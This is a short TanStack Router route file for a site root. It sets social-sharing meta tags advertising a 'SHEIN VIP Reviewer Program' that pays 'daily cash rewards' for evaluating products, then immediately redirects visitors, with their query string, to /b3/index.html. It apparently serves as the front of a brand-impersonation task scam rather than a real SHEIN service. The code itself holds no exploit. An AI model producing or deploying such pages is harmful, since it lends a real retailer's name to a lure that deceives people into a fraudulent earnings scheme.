import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "SHEIN VIP — Product Evaluator" },
      {
        name: "description",
        content: "SHEIN VIP Reviewer Program: evaluate trending fashion items and earn daily cash rewards.",
      },
      { property: "og:title", content: "SHEIN VIP — Product Evaluator" },
      {
        property: "og:description",
        content: "SHEIN VIP Reviewer Program: evaluate trending fashion items and earn daily cash rewards.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { httpEquiv: "refresh", content: "0; url=/b3/index.html" },
    ],
  }),
  component: Index,
});

function Index() {
  useEffect(() => {
    window.location.replace("/b3/index.html" + window.location.search);
  }, []);
  return null;
}
